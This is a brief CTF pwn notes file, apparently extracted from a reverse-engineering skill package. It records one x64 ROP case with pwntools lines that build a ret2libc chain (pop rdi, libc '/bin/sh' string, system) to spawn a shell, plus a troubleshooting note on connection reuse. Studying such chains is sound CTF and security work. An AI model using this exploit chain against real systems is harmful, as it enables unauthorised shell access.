# Binary Exploitation / Pwn

_Source: reverse-skill package (zhaoxuya520/reverse-skill) + field-journal (43 real cases). Extracted 2026-10-21._

## Technique headings
- (see reverse-skill package section below)


## reverse-skill field-journal (2026-10-21 — 1 kasus nyata)

- **seed-010_ctf-pwn-rop-x64**
  - payload += p64(elf.symbols['main'])     # 回到 main 二次利用
  - payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
  - payload += p64(libc_base + libc.symbols['system'])
  - | 一打远程就 SIGPIPE | 第二阶段 payload 还在使用上一轮的 io 对象 | 用 `process` / `remote` 之后 io 必须复用同一个连接，主进程死了就完了 | 20min |
